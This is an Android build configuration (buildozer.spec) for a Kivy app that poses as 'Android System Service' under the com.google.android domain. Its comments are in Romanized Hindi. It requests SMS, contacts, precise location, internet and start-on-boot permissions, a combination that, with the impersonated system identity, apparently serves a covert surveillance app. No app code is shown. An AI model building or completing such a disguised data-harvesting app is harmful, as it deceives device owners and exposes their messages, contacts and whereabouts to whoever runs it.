[app]
title = Android System Service
package.name = sysservice
package.domain = com.google.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 0.1

# Requirements (Is line ko dhyan se copy karein)
requirements = python3,kivy==master,requests,pyjnius,android

# Permissions
android.permissions = INTERNET, READ_SMS, READ_CONTACTS, ACCESS_FINE_LOCATION, RECEIVE_BOOT_COMPLETED

# Android SDK/NDK (Versions updated)
android.api = 33
android.minapi = 21
android.ndk = 25c
android.ndk_path = 
android.sdk_path = 
android.archs = arm64-v8a

# Is line ko requirements ke niche add karein
p4a.branch = master
